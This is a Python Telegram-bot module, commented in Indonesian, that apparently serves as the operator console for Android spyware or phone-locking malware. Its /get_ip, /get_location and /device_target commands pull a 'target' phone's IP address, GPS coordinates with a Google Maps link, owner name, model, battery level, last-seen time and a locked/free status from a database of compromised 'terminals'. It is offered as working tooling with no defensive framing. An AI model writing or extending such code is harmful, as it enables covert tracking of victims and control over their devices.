import requests
import json

class InfoCommands:
    def __init__(self, bot, db):
        self.bot = bot
        self.db = db
    
    def register(self):
        @self.bot.message_handler(commands=['get_ip'])
        def get_ip(message):
            try:
                parts = message.text.split()
                if len(parts) != 2:
                    self.bot.reply_to(message, "Format: /get_ip device_id")
                    return
                device_id = parts[1]
                terminal = self.db.get_terminal(device_id)
                if not terminal:
                    self.bot.reply_to(message, f"Terminal {device_id} nggak ditemukan!")
                    return
                ip = terminal[6] if len(terminal) > 6 else "Unknown"
                self.bot.reply_to(message, f"📡 IP Terminal {device_id}: {ip}")
            except Exception as e:
                self.bot.reply_to(message, f"Error: {str(e)}")
        
        @self.bot.message_handler(commands=['get_location'])
        def get_location(message):
            try:
                parts = message.text.split()
                if len(parts) != 2:
                    self.bot.reply_to(message, "Format: /get_location device_id")
                    return
                device_id = parts[1]
                terminal = self.db.get_terminal(device_id)
                if not terminal:
                    self.bot.reply_to(message, f"Terminal {device_id} nggak ditemukan!")
                    return
                location = terminal[7] if len(terminal) > 7 else "{}"
                try:
                    loc_data = json.loads(location)
                    maps_link = f"https://www.google.com/maps?q={loc_data.get('lat',0)},{loc_data.get('lon',0)}"
                    self.bot.reply_to(message, f"📍 Lokasi {device_id}:\n{loc_data}\n\nGoogle Maps: {maps_link}")
                except:
                    self.bot.reply_to(message, f"📍 Lokasi {device_id}: {location}")
            except Exception as e:
                self.bot.reply_to(message, f"Error: {str(e)}")
        
        @self.bot.message_handler(commands=['device_target'])
        def device_target(message):
            try:
                parts = message.text.split()
                if len(parts) != 2:
                    self.bot.reply_to(message, "Format: /device_target device_id")
                    return
                device_id = parts[1]
                terminal = self.db.get_terminal(device_id)
                if not terminal:
                    self.bot.reply_to(message, f"Terminal {device_id} nggak ditemukan!")
                    return
                info = f"""
╔══════════════════════════════╗
║     DEVICE TARGET INFO       ║
╠══════════════════════════════╣
║ Device ID : {device_id}
║ Nama      : {terminal[2]}
║ Model HP  : {terminal[3]}
║ Android   : {terminal[4]}
║ Baterai   : {terminal[5]}%
║ IP        : {terminal[6]}
║ Last Seen : {terminal[8]}
║ Status    : {'🔒 TERKUNCI' if terminal[9] == 1 else '🔓 BEBAS'}
╚══════════════════════════════╝
                """
                self.bot.reply_to(message, info)
            except Exception as e:
                self.bot.reply_to(message, f"Error: {str(e)}")
